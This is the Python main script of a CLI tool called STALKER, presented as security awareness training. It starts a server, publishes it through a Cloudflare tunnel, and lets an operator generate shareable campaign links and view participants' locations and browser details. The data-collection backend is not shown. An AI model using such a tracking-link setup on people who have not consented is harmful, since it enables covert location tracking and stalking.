#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  STALKER Framework v1.0.0                                    ║
║  Security Tracking Awareness & Learning Knowledge            ║
║  Education Research                                          ║
║                                                              ║
║  Creator: 0xPurpleMiaw16                                     ║
║                                                              ║
║  For authorized cybersecurity training ONLY.                 ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import shutil
import subprocess
import threading
import time

from dotenv import load_dotenv

load_dotenv()

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm, Prompt

from cli.banner import display_banner, display_separator
from cli.menu import display_menu
from cli.campaign import (
    create_campaign,
    generate_awareness_link,
    manage_campaigns,
    view_participant_events,
    view_location_reports,
    view_browser_info,
    generate_report,
    show_configuration,
)

console = Console()

_server_process = None
_tunnel_process = None
_tunnel_url = None


# ── Cloudflared tunnel ────────────────────────────────────────────────────────

def _find_cloudflared() -> str | None:
    """Locate the cloudflared binary."""
    # Check common locations
    for path in [
        shutil.which("cloudflared"),
        os.path.expanduser("~/.local/bin/cloudflared"),
        "/usr/local/bin/cloudflared",
    ]:
        if path and os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    return None


def _parse_tunnel_url(line: str) -> str | None:
    """Extract the https://....trycloudflare.com URL from cloudflared output."""
    match = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", line)
    return match.group(1) if match else None


def _start_tunnel(port: str):
    """Start a Cloudflare quick-tunnel and capture the HTTPS URL."""
    global _tunnel_process, _tunnel_url

    cf_bin = _find_cloudflared()
    if not cf_bin:
        console.print(
            "  [bold red]✗[/] cloudflared not found.\n"
            "  [dim]Install it:[/]\n"
            "    [bright_cyan]curl -sL https://github.com/cloudflare/cloudflared/"
            "releases/latest/download/cloudflared-linux-amd64 "
            "-o ~/.local/bin/cloudflared && chmod +x ~/.local/bin/cloudflared[/]\n"
        )
        return

    console.print(f"\n  [bold green]▶[/] Starting Cloudflare tunnel …")

    _tunnel_process = subprocess.Popen(
        [cf_bin, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    # Read output in a thread to capture the URL
    url_found = threading.Event()

    def _reader():
        global _tunnel_url
        for line in iter(_tunnel_process.stdout.readline, ""):
            parsed = _parse_tunnel_url(line)
            if parsed:
                _tunnel_url = parsed
                # Set env var so the backend picks it up
                os.environ["STALKER_PUBLIC_URL"] = _tunnel_url
                url_found.set()

    reader_thread = threading.Thread(target=_reader, daemon=True)
    reader_thread.start()

    # Wait up to 20 seconds for the URL
    url_found.wait(timeout=20)

    if _tunnel_url:
        console.print(f"  [bold green]✓[/] Tunnel active!\n")
        console.print(
            Panel(
                f"[bold bright_white]Tunnel Active (Base URL):[/]\n\n"
                f"[bold underline bright_cyan]{_tunnel_url}[/]\n\n"
                f"[dim]Gunakan menu [02] Generate Awareness Link\n"
                f"untuk mendapatkan link lengkap (dengan ID campaign) yang bisa disebar.[/]",
                border_style="green",
                padding=(1, 4),
            )
        )
    else:
        console.print("  [yellow]⚠ Tunnel started but URL not captured yet. Check logs.[/]\n")


def _stop_tunnel():
    global _tunnel_process, _tunnel_url
    if _tunnel_process and _tunnel_process.poll() is None:
        _tunnel_process.terminate()
        try:
            _tunnel_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _tunnel_process.kill()
        console.print("  [bold red]■[/] Tunnel stopped.")
    _tunnel_process = None
    _tunnel_url = None
    os.environ.pop("STALKER_PUBLIC_URL", None)


# ── Server management ────────────────────────────────────────────────────────

def start_server():
    """Start the FastAPI training server and optionally a Cloudflare tunnel."""
    global _server_process

    if _server_process and _server_process.poll() is None:
        console.print("  [yellow]⚠ Server is already running.[/]")
        if _tunnel_url:
            console.print(f"  [dim]Tunnel URL: {_tunnel_url}[/]")
        return

    bind_host = os.getenv("STALKER_BIND_HOST", "0.0.0.0")
    display_host = os.getenv("STALKER_HOST", "127.0.0.1")
    port = os.getenv("STALKER_PORT", "8443")

    console.print(f"\n  [bold green]▶[/] Starting STALKER server on [bright_cyan]{bind_host}:{port}[/] …")

    _server_process = subprocess.Popen(
        [
            sys.executable, "-m", "uvicorn",
            "backend.main:app",
            "--host", bind_host,
            "--port", port,
            "--reload",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    console.print(f"  [bold green]✓[/] Server started (PID {_server_process.pid})")
    console.print(f"  [dim]Local URL: http://{display_host}:{port}/train/<campaign_id>[/]")
    console.print(f"  [dim]API docs:  http://{display_host}:{port}/docs[/]\n")

    # Ask about tunnel
    use_tunnel = Confirm.ask(
        "  [bright_cyan]Start HTTPS tunnel for remote participants?[/]",
        default=True,
    )
    if use_tunnel:
        _start_tunnel(port)


def stop_server():
    global _server_process
    _stop_tunnel()
    if _server_process and _server_process.poll() is None:
        _server_process.terminate()
        _server_process.wait()
        console.print("  [bold red]■[/] Server stopped.")
    _server_process = None


# ── Dispatch table ────────────────────────────────────────────────────────────

DISPATCH = {
    "01": create_campaign,
    "02": generate_awareness_link,
    "03": start_server,
    "04": manage_campaigns,
    "05": view_participant_events,
    "06": view_location_reports,
    "07": view_browser_info,
    "08": generate_report,
    "09": show_configuration,
}


def main():
    os.system("clear" if os.name != "nt" else "cls")
    display_banner()
    display_separator()

    while True:
        try:
            choice = display_menu()

            if choice == "00":
                stop_server()
                console.print("\n  [bold bright_magenta]👋 Stay safe. Stay aware.[/]\n")
                break

            handler = DISPATCH.get(choice)
            if handler:
                console.print()
                handler()
            else:
                console.print("  [red]Invalid option.[/]")

            display_separator()

        except KeyboardInterrupt:
            stop_server()
            console.print("\n\n  [bold bright_magenta]👋 Interrupted. Exiting.[/]\n")
            break


if __name__ == "__main__":
    main()
